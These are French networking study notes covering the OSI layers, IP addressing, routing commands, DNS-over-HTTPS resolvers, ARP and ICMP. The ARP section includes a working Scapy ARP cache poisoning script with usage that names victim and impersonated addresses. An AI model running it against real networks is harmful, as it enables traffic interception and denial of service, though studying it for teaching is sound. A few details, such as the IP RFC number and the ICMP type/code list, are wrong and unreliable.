###MODELE OSI :

---

* ###Couche 7
  * Nom : **application**
  * Rôle : RAS.
  * Rôle secondaire : RAS.
  * Matériel associé : le proxy.
---
* ###Couche 6
  * Nom : **presentation**
---  
* ###Couche 5
  * Nom : **session**
---
* ###Couche 4
  * Nom : **transport**
  * Rôle : gérer les connexions applicatives.
  * Rôle secondaire : garantir la connexion.
  * Matériel associé : RAS.
---
* ###Couche 3
  * Nom : **réseau**
  * Rôle : interconnecter les réseaux entre eux.
  * Rôle secondaire : fragmenter les paquets.
  * Matériel associé : le routeur.
  * Protocole : IP, ICMP , ARP
  
La couche 3 va donc me permettre de joindre n'importe quel réseau sur Internet, en passant à travers d'autres réseaux.   
Ma connexion à une machine sur un autre réseau se fera à travers des réseaux, de proche en proche.

traceroute ( permet d'indiquer par quelles machines nous passons pour aller d'un point à un autre sur Internet ) -> Linux  
tracert -> Windows

L'adresse IP est l'adresse du réseau ET de la machine  
Elle est codée sur 4 octets (soit 32 bits, soit 2^32 possibilites) en IPV4  
Masque de Sous-reseau :  (contiguïté des bits)
* 00000000 -> 0
* 10000000 -> 128
* 11000000 -> 192
* 11100000 -> 224
* 11110000 -> 240
* 11111000 -> 248
* 11111100 -> 252
* 11111110 -> 254
* 11111111 -> 255

Ecriture CIDR : 
* 192.168.0.1/255.255.255.0 -> 192.168.0.1/24
* 192.168.0.1/255.255.240.0 -> 192.168.0.1/20

La première adresse d'une plage est l'adresse du réseau lui-même.  
La dernière adresse d'une plage est une adresse spéciale, l'adresse de broadcast.

RFC 79 ( Request For Comment) -> protocole IP  
RFC 1918 -> Cette RFC précise des plages d'adresses, soit des réseaux, qui ont une utilité particulière  
* 10.0.0.0/255.0.0.0
* 172.16.0.0/255.240.0.0
* 192.168.0.0/255.255.0.0

**Protocole ICMP ( internet control message protocol ) :**  contrôler les erreurs de transmission, et débogage réseau

---
* ###Couche 2
  * Nom : **liaison de données**
  * Rôle : connecter les machines entre elles sur un réseau local.
  * Rôle secondaire : détecter les erreurs de transmission.
  * Matériel associé : le switch, ou commutateur.
  * Protocole : ETHERNET, ARP
  
L'adresse MAC est l'adresse d'une carte réseau.
Elle est unique au monde pour chaque carte.
Elle est codée sur 6 octets (soit 48 bits, soit 2^48 possibilites).  
3 premiers octets : achetes par le constructeur  
3 derniers octets : géré par le constructeur

ff:ff:ff:ff:ff:ff -> **adresse de broadcast**

##### TRAME ETHERNET :
**Adresse MAC DST --- Adresse MAC SRC --- Protocole de Couche 3 --- *Donnees* --- CRC**  
Entete Ethernet : 18 Octets  
Taille minimale : 64 Octets  
Taille maximale : 1518 Octets

##### SWITCH :
Analyse le contenu de la couche 2  
Cree une table MAC (Medium-Access-Control) ou table CAM (Content-Addressable-Memory) afin d'aiguiller les trames   
TTL : time to live  
La table MAC est effacée à chaque reboot du switch

**Un VLAN est la capacité de séparer des ports d'un switch dans des réseaux différents.**

Boucle de Commutation ( on offre 2 chemins differents pour une trame ) --> Tempete de Broadcasts

---
* ###Couche 1
  *  Nom : **physique**
  * Rôle : offrir un support de transmission pour la communication.
  * Rôle secondaire : RAS.
  * Matériel associé : le hub, ou concentrateur en français.


**Chaque couche est indépendante , chaque couche ne peut communiquer qu'avec une couche adjacente.**  
**Les couches réseau ( 1 à 4 ) offrent le service de communication à la couche applicative ( 7 )**

---
###COMMANDES RESEAU :
        
        # ------------------------------------------------
        # Windows:
        # ------------------------------------------------
        tracert www. # trace la route d'une adresse
        
        trace route # affiche la table de routage
        netstat -r # affiche la table de routage
        
        
        # ------------------------------------------------
        # Linux:
        # ------------------------------------------------
        traceroute www. # trace la route d une adresse
        
        
        route -n # affiche la table de routage
        ip route # affiche la table de routage
        route del default # suppression route par defaut
        route del -net 192.168.10.0 netmask 255.255.255.0 # suppression route
        route add default gw 10.0.0.254 # ajout de route par defaut
        route add -net 192.168.10.0 netmask 255.255.255.0 gw 192.168.11.254 # cree une route
        
        
        ifconfig eth0 10.0.0.1 netmask 255.255.255.0 # modifie l adresse d une machine
        ifconfig eth0:0 192.168.11.254 netmask 255.255.255.0 # ajout adresse , création interface virtuelle
        
        cat /proc/sys/net/ipv4/ip_forward # affiche la valeur ip_forward
        sysctl net.ipv4.ip_forward # affiche la valeur ip_forward
        
        echo 1 > /proc/sys/net/ipv4/ip_forward # transforme la machine en routeur
        sysctl -w net.ipv4.ip_forward=1
        
        /etc/sysctl.conf: # permanent setting
        net.ipv4.ip_forward = 1
        sudo sysctl -p
        
        tcpdump -i eth0 icmp # sniffer     
---       
### DIVERS :

**DNS over HTTPS :** chiffre le trafic DNS pour empêcher un tiers d’observer les requêtes DNS que vous générez.
( dans firefox : options -> parametres reseau)
**RFC 7858 :** Support de DNS sur TLS ( transport layer security)

Liste Résolveurs DNS ( compatibles DNS-over-HTTPS ) :

* AdGuard – <https://dns.adguard.com/dns-query>
* BlahDNS – <https://doh-fi.blahdns.com/dns-query>
* Cloudflare –  <https://cloudflare-dns.com/dns-query>
    * Pour IPv4: 1.1.1.1 et 1.0.0.1
    * Pour IPv6: 2606:4700:4700::1111 et 2606:4700:4700::1001
    * Test Securite : <https://www.cloudflare.com/ssl/encrypted-sni/>
* CZ.NIC
* dnswarden – <https://doh.dnswarden.com/uncensored>
* Foundation for Applied Privacy – <https://doh.applied-privacy.net/query>
* NextDNS – <https://dns.nextdns.io/<config_id>
* NixNet
* PowerDNS – <https://doh.powerdns.org>
* Quad9 – <https://www.quad9.net/> 
    * 9.9.9.9 ou 2620:fe::fe - Blocklist, DNSSEC, No EDNS Client-Subnet
    * 9.9.9.10 ou 2620:fe::10 - No blocklist, no DNSSEC, send EDNS Client-Subnet

* SecureDNS – https://doh.securedns.eu/dns-query
* Snopyta
* UncensoredDNS 

---


### PROTOCOLE ARP :


ARP est un protocole qui permet d'associer une adresse MAC de couche 2 à une adresse IP de couche 3.  
Requete envoyée en Broadcast  
La table ARP dynamique ( TTL ) va associer adresse IP et adresse MAC correspondante.  

       arp -an # affiche la table arp sous linux
       arp -a # ... sous windows
       
#### ATTAQUE ARP 

Installation de Scapy ( framework ) :

    sudo apt install scapy
    ou
    pip install scapy
##### /root/arpcachepoison.py :

    #!/usr/bin/python
    # Python arp poison example script
    # Written by aviran
    # visit for more details aviran.org
    
    from scapy.all import *
    import sys
    
    def get_mac_address():
        my_macs = [get_if_hwaddr(i) for i in get_if_list()]
        for mac in my_macs:
            if(mac != "00:00:00:00:00:00"):
                return mac
    Timeout=2
    
    if len(sys.argv) != 3:
        print "Usage: arp_poison.py HOST_TO_ATTACK HOST_TO_IMPERSONATE"
        sys.exit(1)
    
    my_mac = get_mac_address()
    if not my_mac:
        print "Cant get local mac address, quitting"
        sys.exit(1)
    
    packet = Ether()/ARP(op="who-has",hwsrc=my_mac,psrc=sys.argv[2],pdst=sys.argv[1])
    
    sendp(packet, loop=1, inter=0.2)

Rendre executable le script :

    chmod 755 arpcachepoison.py 

Utilisation :

    ./arpcachepoison.py 192.168.0.1 192.168.0.254 # addr1=victime addr2=usurpation
    
**Si l'on n'‌active pas le routage , les paquets sont jetés à la poubelle et cela coupe donc toute possibilité de communication.**

---
### PROTOCOLE ICMP :

Le protocole ICMP est donc un "complément" des protocoles de la pile TCP/IP  
Il permet de comprendre plus facilement ce qui se passe sur un réseau quand il y a un problème.

* ICMP sert à indiquer automatiquement des erreurs quand elles surviennent 
    * un code égal à 0 me dira que le réseau n'est pas accessible (globalement, qu'un routeur sur le chemin n'a pas de route pour le réseau destination)
    * un code égal à 1 me dira que la machine n'est pas accessible (une requête ARP a sûrement été envoyée par le dernier routeur, mais personne n'y a répondu)
    * un code égal à 3 indique que le destinataire n'est pas accessible
    * un ode égal à 5 ( ICMP redirect) indique qu'il y a un chemin plus court vers la destination
    * un code égal à 11 ( TTL exceeded ) indique que la durée de vie du paquet a expiré.
    
* ICMP peut fournir des outils pour étudier un problème réseau.
    * Le ping est en fait la combinaison de deux types de messages ICMP, un **echo request** de type 8 et un **echo reply** de type 0. 
    * Le traceroute fait varier la valeur du TTL ( 1,2,3,4...)
        * A chaque TTL=0 il devra jeter le message à la poubelle et me renvoyer un message d'erreur ICMP TTL exceeded. Ainsi, je pourrai connaître son adresse IP 

---

